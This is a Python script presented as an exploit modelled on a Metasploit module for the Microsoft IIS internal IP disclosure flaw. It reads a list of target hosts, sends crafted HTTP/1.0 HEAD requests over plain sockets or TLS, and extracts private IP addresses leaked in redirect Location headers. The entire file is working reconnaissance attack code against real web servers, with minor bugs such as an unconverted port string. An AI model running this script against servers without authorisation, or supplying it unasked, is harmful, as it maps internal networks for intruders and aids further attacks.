import re
import socket
import ssl

# This exploit is inspired by metasaploit module "Microsoft IIS HTTP Internal IP Disclosure"
# hosts list are in format in input file
# <prorocol>://<domain or IP address>:<port>

# input file
hosts_file = r"directory to your hosts file"
hosts_list = open(hosts_file, 'r').readlines()

# Config
protocol = ''
server_name = ''
server_ip = ''
server_port = ''

# We need some 302 redirection to find the internal IP !
# These urls maybe cause a redirect

possible_iis_redirect_urls = [
    '/',
    '/aspnet_client',
    '/images',
    '/uploads',
    '/files'
]

# uncoment the print functions for debugging

def enumerate_internal_IP_addresses():

    for host in hosts_list:
        
        if host[len(host)-1] == "\n":
            host = host[:-1]

        if host == '':
            continue

        protocol = host[ : host.find("://")]
        server_name = host[host.find("://") + 3 : host.find(":", 6)]
        server_port = host[host.find(":", 6) + 1 : ]
        url = '/images'

        if host[0] == "#":
            continue
        
        regex_compiler = re.compile(r"^\d+\.\d+\.\d+\.\d+")

        if regex_compiler.match(server_name) == None:
            try:
                server_ip = socket.gethostbyname(server_name)
                print("* Host {}:{} resolved to IP {}:{}".format(server_name, server_port, server_ip, server_port))
            except:
                # print("[-] Error on resolving the host : {}".format(server_name))
                # print("\n**************************************************************************************\n")
                continue
        else:
            server_ip = server_name
        
        
        if protocol == 'http':

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            try:
                sock.connect((server_ip, server_port))               
            except:
                # print("[-] Error on connecting to the host --> {}:{}".format(server_name, server_port))
                sock.close()
                # print("\n**************************************************************************************\n")
                continue

            try:
                request = "HEAD {} HTTP/1.0\r\n\r\n".format(url)
                sock.sendall(request.encode())                
                response = ''
                while True:
                    recv = sock.recv(1024).decode()
                    if not recv:
                        break
                    response += recv 
                                  
                print(response)

            except:
                pass
                # print("[-] Error on sending request to the host --> {}:{}".format(server_name, server_port))
            

            sock.close()           

        elif protocol == 'https':

            
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)

            try:
                sock = socket.create_connection((server_name, server_port))
                context = ssl.SSLContext()
                ssock = context.wrap_socket(sock, server_hostname=server_name)
                ssock.settimeout(10)
            except:
                # print("[-] Error on creating connnection for {}:{}".format(server_name, server_port))
                sock.close()
                ssock.close()
                # print("\n**************************************************************************************\n")
                continue

            try:
                url = "HEAD {} HTTP/1.0\r\nConnection: close\r\n\r\n".format(url)

                ssock.sendall(url.encode())
                       
                response = ''
                while True:
                    recv = ssock.recv(1024).decode()
                    if not recv:
                        break
                    response += recv 
                
                if response != '' and response.find("Location") > -1 and response.find("https://") > -1:
                    tmp_index_1 = response.find("https://")
                    tmp_index_2 = response.find("/", tmp_index_1 + 8)
                    location = response[ tmp_index_1 + 8 : tmp_index_2 ]
                    print("    [+] private IP address found ----> {}".format(location))
                else:
                    pass
                    # print("[-] No Internal IP address found for {}:{}".format(server_name, server_port))
                    

            except:
                pass
                # print("[-] Error on sending request to the host --> {}:{}".format(server_name, server_port))
        
            sock.close()
            ssock.close()


        # print("\n**************************************************************************************\n")

            
if __name__ == "__main__":
    enumerate_internal_IP_addresses()